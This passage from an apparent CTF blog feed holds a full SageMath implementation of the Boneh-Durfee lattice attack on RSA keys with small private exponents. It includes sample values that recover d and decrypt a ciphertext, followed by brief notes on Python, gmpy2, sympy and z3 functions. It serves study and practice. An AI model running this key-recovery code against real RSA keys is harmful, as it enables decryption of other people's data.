results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don&#x27;t work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> (a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let&#x27;s check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vector&quot;</span>, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vectors&quot;</span>, ii, <span class="string">&quot;and&quot;</span>, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u) <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;looking for independent vectors in the lattice&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>():</span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># How To Use This Script</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># The problem to solve (edit the following values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the modulus</span></span><br><span class="line">    N = <span class="number">0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27</span>    <span class="comment"># the public exponent</span></span><br><span class="line">    e = <span class="number">0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bb</span></span><br><span class="line">    c = <span class="number">0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866c</span></span><br><span class="line">    <span class="comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></span><br><span class="line">    delta = <span class="number">0.270</span> <span class="comment"># this means that d &lt; N^delta</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Lattice (tweak those values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></span><br><span class="line">    m = <span class="number">4</span> <span class="comment"># size of the lattice (bigger the better/slower)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you need to be a lattice master to tweak these</span></span><br><span class="line">    t = <span class="built_in">int</span>((<span class="number">1</span>-<span class="number">2</span>*delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">    X = <span class="number">2</span>*floor(N^delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">    Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>))    <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Don&#x27;t touch anything below</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Problem put in equation</span></span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    A = <span class="built_in">int</span>((N+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    pol = <span class="number">1</span> + x * (A + y)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Find the solutions!</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Checking bounds</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== checking values ===&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* delta:&quot;</span>, delta)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* delta &lt; 0.292&quot;</span>, delta &lt; <span class="number">0.292</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* size of e:&quot;</span>, <span class="built_in">int</span>(log(e)/log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* size of N:&quot;</span>, <span class="built_in">int</span>(log(N)/log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;* m:&quot;</span>, m, <span class="string">&quot;, t:&quot;</span>, t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># boneh_durfee</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== running algorithm ===&quot;</span>)</span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># found a solution?</span></span><br><span class="line">    <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"></span><br><span class="line">        d = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[+] d:&quot;</span> + <span class="built_in">str</span>(d))</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[+] m:&quot;</span> + <span class="built_in">str</span>(m))</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;=== no solution was found ===&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== ALL DONE!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    example()</span><br></pre></td></tr></table></figure>



<h1 id="Addiction"><a href="#Addiction" class="headerlink" title="Addiction"></a>Addiction</h1><p>When we obtain the $m$, there are different ways to get <code>flag</code>.</p>
<ul>
<li>long_to_bytes()</li>
</ul>
<p>Long integer converts to bytes. </p>
<ul>
<li>ASCII</li>
</ul>
<p>The beginning of $m$ is <code>1</code>, and it may convert to some invisible characters. </p>
<p><strong>TBC</strong></p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>factor</tag>
      </tags>
  </entry>
  <entry>
    <title>22-11-15-Functions</title>
    <url>/2022/11/15/22-11-15-functions/</url>
    <content><![CDATA[<p>To conclude the functions that I met in these years. </p>
<p>Just show that how the functions and equations </p>
<p>make a one-to-one relation. </p>
<p>Relating to <strong>python</strong>, <strong>sagemath</strong>â€¦â€¦</p>
<span id="more"></span>

<h1 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h1><h2 id="normal"><a href="#normal" class="headerlink" title="normal"></a>normal</h2><h3 id="num-bit-length"><a href="#num-bit-length" class="headerlink" title="num.bit_length()"></a>num.bit_length()</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">generate_prime(<span class="number">10</span>).bit_length()</span><br><span class="line"><span class="comment"># 10</span></span><br><span class="line">num = <span class="number">1024</span></span><br><span class="line">num.bit_length()</span><br><span class="line"><span class="comment"># 11</span></span><br><span class="line"><span class="number">1024.</span>bit_length()</span><br><span class="line"><span class="comment"># error</span></span><br></pre></td></tr></table></figure>



<h2 id="gmpy2"><a href="#gmpy2" class="headerlink" title="gmpy2"></a>gmpy2</h2><h3 id="gcd"><a href="#gcd" class="headerlink" title="gcd()"></a>gcd()</h3><blockquote>
<p>input: gcd(a, b)</p>
<p>output: the greatest</p>
</blockquote>
<p>To solve out the greatest common factor between $a$ and $b$</p>
<h3 id="gcdext-a-b"><a href="#gcdext-a-b" class="headerlink" title="gcdext(a, b)"></a>gcdext(a, b)</h3><h3 id="invert-a-n"><a href="#invert-a-n" class="headerlink" title="invert(a, n)"></a>invert(a, n)</h3><h3 id="powmod-a-b-c"><a href="#powmod-a-b-c" class="headerlink" title="powmod(a, b, c)"></a>powmod(a, b, c)</h3><h3 id="next-prime-a"><a href="#next-prime-a" class="headerlink" title="next_prime(a)"></a>next_prime(a)</h3><h3 id="iroot"><a href="#iroot" class="headerlink" title="iroot()"></a>iroot()</h3><h2 id="pycryptodome"><a href="#pycryptodome" class="headerlink" title="pycryptodome"></a>pycryptodome</h2><h3 id="bytes-to-long"><a href="#bytes-to-long" class="headerlink" title="bytes_to_long()"></a>bytes_to_long()</h3><h3 id="long-to-bytes"><a href="#long-to-bytes" class="headerlink" title="long_to_bytes()"></a>long_to_bytes()</h3><h2 id="sympy"><a href="#sympy" class="headerlink" title="sympy"></a>sympy</h2><blockquote>
<p><a href="https://geek-docs.com/sympy/sympy-method/python-sympy-solve-method.html">sympy.solve()æ–¹æ³•|æå®¢æ•™ç¨‹ (geek-docs.com)</a></p>
</blockquote>
<h3 id="symbol"><a href="#symbol" class="headerlink" title="symbol()"></a>symbol()</h3><blockquote>
<p>input: unknowns</p>
<p>output: defined unknowns</p>
</blockquote>
<p>Define the unknowns, such as $x$, $y$, etc.</p>
<p>Two ways to define: </p>
<ul>
<li>an unknown quantity: <code>x = Symbol(&#39;x&#39;)</code></li>
<li>more than one unknown quantity: <code>x, y = symbols(&#39;x y&#39;)</code></li>
</ul>
<h3 id="solve"><a href="#solve" class="headerlink" title="solve()"></a>solve()</h3><blockquote>
<p>input: solve([equations], [unknowns])</p>
<p>output: the root of the equations</p>
</blockquote>
<h2 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h2><p><strong>install</strong></p>
<ul>
<li>cmd <code>pip install z3_solver</code></li>
<li>pycharm <code>setting -&gt; python interpreter -&gt; + -&gt; search for z3_solver.eg</code></li>
</ul>
<p><strong>import</strong></p>
<ul>
<li><code>from z3 import *</code></li>
<li><code>import z3</code></li>
</ul>
<h3 id="Int-x2F-Ints"><a href="#Int-x2F-Ints" class="headerlink" title="Int()&#x2F;Ints()"></a>Int()&#x2F;Ints()</h3><blockquote>
<p>input: unknown</p>
<p>output: Integer variable. </p>
<p>eg: 3, 5, 7â€¦â€¦</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">a, b = Ints(<span class="string">&#x27;a b&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="Real-x2F-Reals"><a href="#Real-x2F-Reals" class="headerlink" title="Real()&#x2F;Reals()"></a>Real()&#x2F;Reals()</h3><blockquote>
<p>input: unknown</p>
<p>output: Real variable. </p>
<p>eg: $2^{\frac{1}{2}}$â€¦â€¦</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = Real(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># or </span></span><br><span class="line">a, b = Reals(<span class="string">&#x27;a b&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><em>Same above.</em></p>
<h3 id="BitVec-x2F-BitVecs"><a href="#BitVec-x2F-BitVecs" class="headerlink" title="BitVec()&#x2F;BitVecs()"></a>BitVec()&#x2F;BitVecs()</h3><blockquote>
<p>input: bit vector unknown</p>
<p>output: bit vectors</p>
<p>eg: 11000001, 11111000â€¦â€¦</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = BitVec(<span class="string">&#x27;a&#x27;</span>, <span class="number">8</span>)</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">a, b = BitVecs(<span class="string">&#x27;a b&#x27;</span>, <span class="number">8</span>)</span><br></pre></td></tr></table></figure>



<h3 id="Solver"><a href="#Solver" class="headerlink" title="Solver()"></a>Solver()</h3><blockquote>
<p>create a  Solver to calculate</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = Solver()</span><br></pre></td></tr></table></figure>

<h3 id="add"><a href="#add" class="headerlink" title="add()"></a>add()</h3><blockquote>
<p>input: equations or constraints</p>
<p>output: add to conditions</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># s = Solver()</span></span><br><span class="line"><span class="comment"># equ = [a + b == 10, a - b == 6]</span></span><br><span class="line">s.add(equ)</span><br></pre></td></tr></table></figure>



<h3 id="check"><a href="#check" class="headerlink" title="check()"></a>check()</h3><blockquote>
<p>to check the conditions and solve out</p>
<p>output: sat &#x2F; unsat</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># s.add(equ)</span></span><br><span class="line">s.check()</span><br><span class="line"><span class="comment"># sat</span></span><br></pre></td></tr></table></figure>



<h3 id="model"><a href="#model" class="headerlink" title="model()"></a>model()</h3><blockquote>
<p>solve out the satisfied roots</p>
